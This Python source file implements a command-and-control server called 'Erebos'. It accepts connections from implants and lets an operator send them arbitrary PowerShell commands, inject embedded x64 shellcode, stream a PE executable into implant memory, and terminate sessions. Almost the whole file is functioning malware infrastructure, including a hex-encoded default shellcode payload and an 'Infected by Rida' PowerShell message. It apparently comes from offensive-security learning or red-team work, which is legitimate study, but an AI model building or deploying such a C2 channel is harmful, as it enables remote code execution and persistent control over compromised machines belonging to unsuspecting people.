import struct, socket, threading, sys
from time import sleep

# Default MessageBox as PWSH padded on 4096 bytes
defaultCmdData = b"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')".ljust(4096, b"\x00")
# Default shellcode Messagebox
defaultShellCode = bytes.fromhex("fc4881e4f0ffffffe8cc00000041514150524831d2515665488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d050448b40208b48184901d0e35648ffc9418b34884801d64d31c94831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5de80b0000007573657233322e646c6c005941ba4c772607ffd549c7c100000000e811000000496e6a65637465642062792052696461005ae80600000050776e65640041584831c941ba45835607ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5").ljust(4096, b"\x00")

class C2:
    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 8888
        self.activeimplant = {} 
        self.implantcount = 0
        self.lock = threading.Lock()

    def banner(self):
        art = r"""
   _______   _______   ____  ____
  / __/ _ \/ __/ _ )/ __ \/ __/
 / _// , _/ _// _  / /_/ /\ \  
/___/_/|_/___/____/\____/___/  C2
          by : 0xRzdhop
        """
        print(art)
        print("Type 'help' to see available commands.\n")

    def remove_implant(self, implant):
        with self.lock:
            if implant.implant_id in self.activeimplant:
                del self.activeimplant[implant.implant_id]
                print(f"[-] Session {implant.implant_id} removed. Active: {len(self.activeimplant)}")
            else:
                print(f"[!] Session {implant.implant_id} not found in active list")

    def startC2(self):
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(50)
        self.server_sock.setblocking(False)
        print(f"[*] C2 Listening on {self.host}:{self.port}")

        threading.Thread(target=self.cli, daemon=True).start()

        try:
            while True:
                try:
                    sock, addr = self.server_sock.accept()
                    with self.lock:
                        implant_id = self.implantcount
                        new_implant = Implant(implant_id, sock, addr, self)
                        self.activeimplant[implant_id] = new_implant
                        self.implantcount += 1
                    print(f"\n[+] New session established: {implant_id} from {addr}")
                except BlockingIOError:
                    sleep(0.1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
            sys.exit()

    def cli(self):
        self.banner()
        while True:
            cmd = input("Erebos > ").strip().split()
            if not cmd: continue
            command = cmd[0].lower()

            if command == "help":
                print("\n--- Global Commands ---")
                print("  list             : Show all connected implants")
                print("  go <id>          : Interact with a specific implant")
                print("  exit             : Close the C2 server")
                
            elif command == "list":
                if not self.activeimplant:
                    print("[-] No active sessions.")
                else:
                    print("\nID\tIP Address\t\tPort")
                    print("--\t----------\t\t----")
                    with self.lock:
                        for i_id, obj in self.activeimplant.items():
                            print(f"{i_id}\t{obj.addr[0]}\t\t{obj.addr[1]}")

            elif command == "go":
                if len(cmd) < 2: 
                    print("[!] Usage: go <id>")
                    continue
                try:
                    target_id = int(cmd[1])
                    if target_id in self.activeimplant:
                        self.interact_menu(self.activeimplant[target_id])
                    else:
                        print(f"[-] Session {target_id} not found.")
                except ValueError:
                    print("[!] Session ID must be a number.")

            elif command == "exit":
                sys.exit()
            else:
                print(f"[-] Unknown command: {command}")

    def interact_menu(self, implant):
        print(f"\n[*] Interacting with session {implant.implant_id} ({implant.addr[0]})")
        
        # Helper function to send data with 4096-byte padding
        def send_formatted(cmd_id, data_bytes):
            if len(data_bytes) > 4096:
                print(f"[!] Data too large ({len(data_bytes)} bytes). Max is 4096.")
                return
            implant.SendImplant(cmd_id, data_bytes.ljust(4096, b"\x00"))

        while True:
            user_input = input(f"(session_{implant.implant_id}) > ").strip()
            if not user_input: continue
            
            parts = user_input.split(maxsplit=1)
            command = parts[0].lower()
            args = parts[1] if len(parts) > 1 else None

            if command == "help":
                print("\n--- Implant Commands ---")
                print("  ps               : Execute default PowerShell MessageBox")
                print("  ps <cmd>         : Execute custom PowerShell command")
                print("  sc               : Inject default POC Shellcode")
                print("  load <path>      : Load local PE.exe on implant memory")
                print("  kill             : Terminate implant and close session")
                print("  back             : Return to main menu")

            elif command == "back":
                break

            elif command == "ps":
                if not args:
                    implant.SendImplant(1, defaultCmdData)
                else:
                    # Conversion en UTF-16LE pour l'implant C (LPCWSTR)
                    encoded_cmd = args.encode('utf-16le')
                    send_formatted(1, encoded_cmd)

            elif command == "sc":
                implant.SendImplant(2, defaultShellCode)

            elif command == "load":
                if not args:
                    print("[!] Usage: load <path.exe>")
                    continue
                try:
                    with open(args, "rb") as f:
                        file_data = f.read()
                    
                    file_size = len(file_data)
                    print(f"[*] Sending PE ({file_size} bytes)...")
                    
                    # 1. Annonce de la taille
                    size_header = struct.pack("<Q", file_size).ljust(4096, b"\x00")
                    implant.SendImplant(3, size_header)
                    
                    # 2. Envoi des chunks
                    sent = 0
                    for i in range(0, file_size, 4096):
                        chunk = file_data[i : i + 4096]
                        if len(chunk) < 4096:
                            chunk = chunk.ljust(4096, b"\x00")
                        
                        implant.SendImplant(4, chunk)
                        sent += len(chunk)
                        
                        if i % (4096 * 10) == 0:
                            sleep(0.1)
                    
                
                    implant.implant_sock.setblocking(False)
                    print(f"[+] PE {args} sent successfully.")
                except Exception as e : 
                    print(f"[-] Error ! {e.with_traceback}")

            elif command == "kill":
                implant.SendImplant(0x10, b"\x00".ljust(4096, b"\x00"))
                print("[*] Kill signal sent.")
                implant.implant_sock.close()
                self.remove_implant(implant)
                break

            else:
                print(f"[-] Invalid: {command}")

class Implant:
    def __init__(self, implant_id, sock, addr, context):
        self.implant_id = implant_id
        self.implant_sock = sock
        self.addr = addr
        self.context = context

    def SendImplant(self, cmdId: int, Data: bytes):
        try:
            c2_pkt = struct.pack("<I4096s", cmdId, Data)
            self.implant_sock.sendall(c2_pkt)
            print(f"[+] Command {cmdId} sent.")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    C2().startC2()